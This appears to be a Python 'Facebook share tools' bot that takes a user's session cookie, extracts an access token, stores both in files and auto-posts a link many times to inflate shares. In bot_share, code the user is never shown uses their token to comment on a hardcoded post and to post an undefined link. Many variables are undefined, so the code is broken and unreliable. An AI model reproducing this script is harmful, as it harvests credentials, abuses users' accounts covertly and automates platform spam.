#----------OWNER----------#
#----------PYXTON----------#
import requests, os, re, bs4, calendar, sys, json, time, random, datetime, subprocess, logging, base64,uuid
from datetime import datetime
from time import sleep
from time import sleep as jeda
from time import strftime
from random import choice
from pathlib import Path
from rich.console import Console as sol
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich.text import Text as tekz
from rich.panel import Panel as nel
from rich import print as cetak
ses=requests.Session()

#----------DATE----------#
date = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10': 'October', '11': 'November', '12': 'December'}
tgl = datetime.now().day
bln = date[(str(datetime.now().month))]
thn = datetime.now().year
tanggal = (str(tgl)+' '+str(bln)+' '+str(thn))
date = strftime('%H:%M:%S')
hari = datetime.now().strftime("%A")

#----------USERAGENT----------#
ua_default = 'Mozilla/5.0 (Linux; Android 3.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.66 Mobile Safari/537.36'
ua_samsung = 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]'
ua_nokia   = 'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'
ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_oppo    = 'Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_vivo    = 'Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_iphone  = 'Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1 Mobile/15E148 Safari/604.1'
ua_asus    = 'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_lenovo  = 'Mozilla/5.0 (Linux; U; Android 5.0.1; ru-RU; Lenovo A788t Build/LRX22C) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.3.0.950 U3/0.8.0 Mobile Safari/E7FBAF'
ua_huawei  = 'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_windows = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_chrome  = 'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.58 Mobile Safari/537.36'
ua_fb      = 'Mozilla/5.0 (Linux; Android 8.0.0; RNE-L21 Build/HUAWEIRNE-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/360.0.0.30.113;]'
ua_random = random.choice([ua_default,ua_samsung,ua_nokia,ua_xiaomi,ua_oppo,ua_vivo,ua_iphone,ua_asus,ua_lenovo,ua_huawei,ua_windows,ua_chrome,ua_fb])

#----------LOGO----------#
def logo_menu():
 li = ' WELCOME TO FACEBOOK SHARE TOOLS '
 lo = mark(li, style='white')
 sol().print(lo, style='blue')
 banner = f''' 
\x1b[0;95m888    d8P  8888888 8888888888     d8888 Y88b   d88P 
\x1b[0;95m888   d8P     888   888           d88888  Y88b d88P  
\x1b[0;95m888  d8P      888   888          d88P888   Y88o88P   
\x1b[0;95m888d88K       888   8888888     d88P 888    Y888P    
\x1b[0;95m8888888b      888   888        d88P  888     888     
\x1b[0;95m888  Y88b     888   888       d88P   888     888     
\x1b[0;95m888   Y88b    888   888      d8888888888     888     
\x1b[0;95m888    Y88b 8888888 888     d88P     888     888 '''
 cetak(nel(banner,title=f'{P2} {H2}[ {P2}••• {H2}]',subtitle_align='left',padding=1,style='blue'))

#----------MENU----------#
def login():
	os.system("clear")
	cetak(nel(f'   {H2}        LOGIN COOKIES FIRST BRO\n\n      {H2}       [ GITHUB : H4X-GG ]',title=f'{P2} {H2}[ {OT} WELCOME {H2}]',width=54,padding=(1,4),style='blue'))
	cetak(nel(f'{P2}        {H2}   TAKE COOKIES FROM KIWI BROWSER',subtitle=f'{PT}┌─[ {OT} COOKIES {PT}]',subtitle_align='left',width=54,padding=1,style='blue'))
	cookie = input(f"{P}   └──> : {H}")
	try:
		data = ses.get("https://business.facebook.com/business_locations",headers={"user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","cookie":cookie})
		find_token = re.search("(EAAG\w+)", data.text)
		open(".token.xx.txt", "w").write(find_token.group(1))
		open(".cookie.xx.txt", "w").write(cookie)
		cetak(nel(f'{OT} SUCCESSFUL   LOGIN',width=24,style=f"#00FF00"));time.sleep(2)
		bot_share()
	except:
		os.system("rm .token.txt .cookie.txt")
		cetak(nel(f'{OT} COOKIE INVALID',width=22,style=f"#00FF00"));time.sleep(1.5) 
		login()

#----------SHARE----------#
def bot_share():
	os.system('clear')
	try:
		token = open(".token.xx.txt","r").read()
		cok = open(".cookie.xx.txt","r").read()
		cookie = {"cookie":cok}
		ip = requests.get("https://api.ipify.org").text
		nama = ses.get(f"https://graph.facebook.com/me/feed?link={lija_xan}&published=0&access_token={token}",headers=header, cookies=coki).json()
		id = requests.get("https://graph.facebook.com/me/feed?link={lija_xan}& published=0&access_token=%s"%(token),cookies={"cookie":coki}).json()  
		requests.post(f"https://graph.facebook.com/826244541950192/comments/?message={kom1}&access_token={token}", headers = {"cookie":cok})
	except:
		os.system("rm .token.xx.txt .cookie.xx.txt")
		cetak(nel(f'\x1b[1;95COOKIE INVALID!!',width=22,style=f"#00FF00"));time.sleep(1.5)
		login()
	os.system('clear')
	logo_menu()
	cetak(nel(f'''{P2} USER ACTIVE     : {H2}{nama} 
{P2} YOUR ID         : {id}
{P2} YOUR IP         : {ip}
{P2} CURRENT DATE    : {hari}, {tanggal}''',title=f'{P2} {H2}[ {P2}USER INFORMATION {H2}]',subtitle_align='left',padding=1,style='blue'))
	cetak(nel(f'{P2}HI {H2}{nama}{P2}, COPY THE POST LINK MUST BE FROM FACEBOOK LITE OTHERWISE AN ERROR WILL OCCUR WHEN THE SHARE BOT PROCESS IS RUNNING.',title=f'{P2} {H2}[ {P2}NOTES {H2}]',subtitle_align='left',padding=1,style='blue'))
	cetak(nel(f'{P2} ENTER THE POST LINK',subtitle=f'{P2}┌─',subtitle_align='left',width=25,padding=0,style='blue'))
	link = input(f"{P}   └──> : {H}")
	cetak(nel(f'{P2} AMOUNT OF SHARES',subtitle=f'{P2}┌─',subtitle_align='left',width=22,padding=0,style='blue'))
	jumlah = int(input(f"{P}   └──> : {H}"))
	cetak(nel(f'{P2} AUTO SHARE IS RUNNING',subtitle=f'{P2}┌─',subtitle_align='left',width=29,padding=0,style='blue'))
	basariganteng = datetime.now()
	try:
		n = 0
		header = {"authority":"graph.facebook.com","cache-control":"max-age=0","sec-ch-ua-mobile":"?0","user-agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.66 Safari/537.36"}
		for x in range(jumlah):
			n+=1
			post = ses.post(f"https://graph.facebook.com/v13.0/me/feed?link={link}&published=0&access_token={token}",headers=header, cookies=cookie).text
			data = json.loads(post)
			if "id" in post:
				bas = str(datetime.now()-basariganteng).split('.')[0]
				print(f'{P}\r   └──> {bas} SUCCESSFUL SHARING {H}{n}{P} POST {N} ',end='');sys.stdout.flush()
			else:
				print("\n")
				cetak(nel(f'{P2} AUTO SHARE STOP POSSIBILITY OF INVALID COOKIES',width=35,padding=0,style='red'));exit()
	except requests.exceptions.ConnectionError:
		print(f"\n{P}(!)  YOU ARE NOT CONNECTED TO THE INTERNET!!!");exit()
bot_share()
